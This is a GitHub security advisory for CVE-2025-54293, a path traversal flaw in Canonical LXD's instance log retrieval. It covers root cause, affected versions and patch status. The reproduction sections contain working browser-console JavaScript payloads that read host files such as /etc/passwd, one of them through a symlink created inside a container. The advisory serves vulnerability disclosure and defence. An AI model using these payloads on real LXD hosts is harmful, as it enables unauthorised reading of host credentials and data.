# [H] Canonical LXD Path Traversal Vulnerability in Instance Log File Retrieval Function

## Summary
Severity: High
Advisory: GHSA-472f-vmf2-pr3h
CVE: CVE-2025-54293
CWE: CWE-22
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2025-10-02
Source: https://github.com/advisories/GHSA-472f-vmf2-pr3h
Type: github-advisory

## Affected
- Go: `github.com/canonical/lxd` — affected >=4.0 <5.21.4
- Go: `github.com/canonical/lxd` — affected >=6.0 <6.5
- Go: `github.com/canonical/lxd` — affected >=0.0.0-20200331193331-03aab09f5b5c <0.0.0-20250224180022-ec09b24179f3

## Details
### Impact
Although outside the scope of this penetration test, a path traversal vulnerability exists in the validLogFileName function that validates log file names in lxd/instance_logs.go in the LXD 5.0 LTS series.

This vulnerability was fixed in PR #15022 in February 2025, and is fixed in at least LXD 5.21 and later. However, this PR appears to be primarily aimed at code improvement rather than vulnerability fixing, with the vulnerability being fixed as a side effect. Therefore, no CVE number has been issued, and no security patch has been made for LXD 5.0 and earlier. 

However, since LXD 5.0 LTS is still in its support period and installation procedures are explained in official documentation, we judge that environments affected by this vulnerability likely exist and report it.

Implementation in vulnerable versions (LXD 5.0 LTS series):

https://github.com/canonical/lxd/blob/1f8c9f77782784900960bb3b8577c1491db59277/lxd/instance_logs.go#L152-L163

This function allows filenames starting with snapshot_ or migration_, but lacks sufficient validation for the portion after the prefix, enabling path traversal attacks. The fixed version is as follows:

Implementation in fixed versions (LXD 5.21 and later):

https://github.com/canonical/lxd/blob/43d5189564d27f6161b430ed258c8b56603c2759/lxd/instance_logs.go#L665-L679

https://github.com/canonical/lxd/blob/43d5189564d27f6161b430ed258c8b56603c2759/shared/util.go#L833-L835

This function ensures that filenames do not contain /, \, or .. .

Note that in Linux generally, path traversal like /not_exist_folder/../exist_folder/ is rejected within system calls and doesn't
succeed. 

However, in this case, the attack succeeds because URL normalization by golang's filepath.Join is performed beforehand.

Related part of instanceLogGet function:

https://github.com/canonical/lxd/blob/43d5189564d27f6161b430ed258c8b56603c2759/lxd/instance_logs.go#L218-L269

Related part of instanceLogDelete function:

https://github.com/canonical/lxd/blob/43d5189564d27f6161b430ed258c8b56603c2759/lxd/instance_logs.go#L331-L347

In the fixed version, filenames containing path traversal strings are rejected at the validLogFileName stage through pre-checking by shared.IsFileName.

### Reproduction Steps

All reproduction steps for this finding must be performed on LXD 5.0.

1. Log in with an account having access to LXD-UI
2. Open browser DevTools and execute the following JavaScript to attempt path traversal
attack:

```js
(async () => {
const projectName = prompt("Enter target project name:");
const instanceName = prompt("Enter target instance
name:");
const maliciousLogFile =
encodeURIComponent('snapshot_../../../../../../../../../../etc
/passwd');
const response = await
fetch(`/1.0/instances/${instanceName}/logs/${maliciousLogFile}
?project=${projectName}`, {
method: 'GET',
credentials: 'include'
});
const content = await response.text();
console.log(content);
})();
```

### Description (2)
A similar issue also exists in the validExecOutputFileName function:

https://github.com/canonical/lxd/blob/43d5189564d27f6161b430ed258c8b56603c2759/lxd/instance_logs.go#L681-L688

For exec-output, since a suffix is specified, it appears that arbitrary files cannot be specified.
However, if an attacker has command execution privileges within a container, they can create a symbolic link that satisfies the suffix condition within the container and have the LXD host access it to perform the attack.

### Reproduction Steps (2)

1. Open terminal in instance using LXD-UI and create symbolic link:

```
ln -s /etc/passwd exec_XXX-symlink.stdout
```

2. Execute the following JavaScript in browser DevTools to read files via symbolic link:

```js
(async () => {
const projectName = prompt("Enter target project name:");
const instanceName = prompt("Enter target instance
name:");
const maliciousExecFile =
encodeURIComponent(`exec_../../../../../../../../../../../var/
snap/lxd/common/lxd/storage-pools/${projectName}/containers/${
instanceName}/rootfs/root/exec_XXX-symlink.stdout`);
const response = await
fetch(`/1.0/instances/${instanceName}/logs/exec-output/${malic
iousExecFile}?project=${projectName}`, {
method: 'GET',
credentials: 'include'
});
const content = await response.text();
console.log(content);
})();
```

This technique allows attackers with command execution privileges within a container to create symbolic links and attempt access to the host filesystem.

### Risk
This vulnerability exists in the LXD 5.0 LTS series, which appears to remain in widespread use, and if attackers have access to arbitrary projects and instances, they can read arbitrary files on the LXD host. 

This could lead to leakage of the following information:
-​ LXD host configuration files (/etc/passwd, /etc/shadow, etc.)
-​ LXD database files (containing information about all projects and instances)
-​ Configuration files and data of other instances
-​ Sensitive information on the host system

### Countermeasures
Since this vulnerability has already been fixed, the primary countermeasures are providing information to users running older versions of LXD and, if possible, backporting to other LTS versions:

### Patches

| LXD Series  | Status |
| ------------- | ------------- |
| 6 | Fixed in LXD 6.5  |
| 5.21 | Fixed in LXD 5.21.4  |
| 5.0 | Ignored - Not critical |
| 4.0  | Ignored - Not critical  |

### References
Reported by GMO Flatt Security Inc.

## References
- https://github.com/canonical/lxd/security/advisories/GHSA-472f-vmf2-pr3h
- https://nvd.nist.gov/vuln/detail/CVE-2025-54293
- https://github.com/canonical/lxd/pull/15022
- https://github.com/canonical/lxd
- https://pkg.go.dev/vuln/GO-2025-4000
